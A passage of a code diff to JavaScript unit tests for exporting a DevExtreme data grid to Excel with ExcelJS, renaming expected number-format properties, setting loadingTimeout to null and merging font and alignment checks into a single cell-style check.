-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.0,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000000,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.0,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000000,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2280,22 +2235,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'billions', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.0,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000000,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.0,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000000,,,"B"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2318,22 +2273,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'trillions', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.0,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000000,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.0,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000000,,,,"T"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2357,23 +2312,23 @@ const moduleConfig = {
                     { dataField: 'f6', dataType: 'number', format: { type: 'currency', precision: 5 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '$#,##0.00_);\\($#,##0.00\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '$#,##0.0000_);\\($#,##0.0000\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '$#,##0_);\\($#,##0\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '$#,##0_);\\($#,##0\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '$#,##0.0_);\\($#,##0.0\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '$#,##0.00000_);\\($#,##0.00000\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(5) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '$#,##0.00_);\\($#,##0.00\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '$#,##0.0000_);\\($#,##0.0000\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '$#,##0_);\\($#,##0\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '$#,##0_);\\($#,##0\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '$#,##0.0_);\\($#,##0.0\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '$#,##0.00000_);\\($#,##0.00000\\)', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(5) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 6 }, { row: 1, column: 6 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2416,16 +2371,16 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
                 { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.String, dataType: 'string', alignment: alignLeftTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
                 { excelCell: { value: ds[0].f2, type: ExcelJS.ValueType.Number, dataType: 'number', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: '[$-9]M\\/d\\/yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f3, rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: '[$-9]M\\/d\\/yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f3, rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
                 { excelCell: { value: ds[0].f4, type: ExcelJS.ValueType.Boolean, dataType: 'boolean', alignment: alignCenterTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
                 { excelCell: { value: 'name1', type: ExcelJS.ValueType.String, dataType: 'string', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f5, rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } },
-                { excelCell: { value: expectedExcelDateTimeValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: '[$-9]M\\/d\\/yyyy, H:mm AM/PM', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f6, rowType: 'data', data: ds[0], column: dataGrid.columnOption(5) } }
+                { excelCell: { value: expectedExcelDateTimeValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: '[$-9]M\\/d\\/yyyy, H:mm AM/PM', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f6, rowType: 'data', data: ds[0], column: dataGrid.columnOption(5) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
@@ -2433,8 +2388,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 6 }, { row: 1, column: 6 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -2467,7 +2421,7 @@ const moduleConfig = {
                     visible: true
                 },
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -2483,8 +2437,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2507,7 +2460,7 @@ const moduleConfig = {
                     { dataField: 'f3', caption: 'f3', dataType: 'string' },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -2526,8 +2479,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 3 }, { row: 2, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2550,7 +2502,7 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 wordWrapEnabled: true,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -2569,8 +2521,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: false })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 3 }, { row: 2, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2594,7 +2545,7 @@ const moduleConfig = {
                     { dataField: 'f3', caption: 'f3', dataType: 'string', width: 300 },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -2612,8 +2563,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels, undefined], topLeft.column);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2637,7 +2587,7 @@ const moduleConfig = {
                     { dataField: 'f3', caption: 'f3', dataType: 'string', width: 300 },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -2655,8 +2605,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels, undefined], topLeft.column);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2680,7 +2629,7 @@ const moduleConfig = {
                     { dataField: 'f3', caption: 'f3', dataType: 'string', width: 500, allowExporting: false },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -2698,8 +2647,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels, undefined], topLeft.column);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2723,7 +2671,7 @@ const moduleConfig = {
                     { dataField: 'f3', caption: 'f3', dataType: 'string', width: 250 },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -2743,8 +2691,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 3 }, { row: 2, column: 3 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn250Pixels, excelColumnWidthFromColumn100Pixels], topLeft.column);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2768,7 +2715,7 @@ const moduleConfig = {
                     { dataField: 'f3', caption: 'f3', dataType: 'string', width: 250, fixed: true, fixedPosition: 'left' },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -2788,8 +2735,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 3 }, { row: 2, column: 3 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromColumn250Pixels, excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels], topLeft.column);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2813,7 +2759,7 @@ const moduleConfig = {
                     { dataField: 'f3', caption: 'f3', dataType: 'string', width: 250 },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -2833,8 +2779,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 3 }, { row: 2, column: 3 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn250Pixels, excelColumnWidthFromColumn150Pixels], topLeft.column);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2855,7 +2800,7 @@ const moduleConfig = {
                     { dataField: 'f2', caption: 'f2', dataType: 'string' },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -2875,8 +2820,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 5, column: 1 }, { row: 5, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 4, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 1, 0, 1], topLeft.row);
@@ -2897,7 +2841,7 @@ const moduleConfig = {
                             { caption: 'f2', dataField: 'f2', dataType: 'string' }
                         ],
                         remoteOperations: remoteOperations,
-                        loadingTimeout: undefined
+                        loadingTimeout: null
                     }).dxDataGrid('instance');
 
                     const expectedCells = [[
@@ -2913,8 +2857,7 @@ const moduleConfig = {
                     exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                         helper.checkRowAndColumnCount({ row: 3, column: 1 }, { row: 3, column: 1 }, topLeft);
                         helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 2, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row });
-                        helper.checkFont(expectedCells);
-                        helper.checkAlignment(expectedCells);
+                        helper.checkCellStyle(expectedCells);
                         helper.checkValues(expectedCells);
                         helper.checkMergeCells(expectedCells, topLeft);
                         helper.checkOutlineLevel([0, 0, 1], topLeft.row);
@@ -2938,7 +2881,7 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -2973,7 +2916,7 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -3005,7 +2948,7 @@ const moduleConfig = {
                     { dataField: 'f2', caption: 'f2', width: 150 },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -3028,8 +2971,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, undefined], topLeft.column);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 3, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 1, 1], topLeft.row);
@@ -3051,7 +2993,7 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -3084,7 +3026,7 @@ const moduleConfig = {
                 ],
                 wordWrapEnabled: true,
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -3104,8 +3046,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 5, column: 1 }, { row: 5, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 4, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 1, 0, 1], topLeft.row);
@@ -3128,7 +3069,7 @@ const moduleConfig = {
                 wordWrapEnabled: true,
                 dataSource: ds,
                 rtlEnabled: true,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -3148,8 +3089,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: false, wrapText: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 5, column: 1 }, { row: 5, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 4, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row, rightToLeft: true });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 1, 0, 1], topLeft.row);
@@ -3168,7 +3108,7 @@ const moduleConfig = {
                     { dataField: 'f2', dataType: 'string' },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[0]]
             }).dxDataGrid('instance');
@@ -3184,8 +3124,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 1 }, { row: 2, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 1], topLeft.row);
@@ -3204,7 +3143,7 @@ const moduleConfig = {
                     { dataField: 'f2', dataType: 'string' },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[1]]
             }).dxDataGrid('instance');
@@ -3220,8 +3159,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 1 }, { row: 2, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 1], topLeft.row);
@@ -3240,7 +3178,7 @@ const moduleConfig = {
                     { dataField: 'f2', dataType: 'string' }
                 ],
                 dataSource: ds,
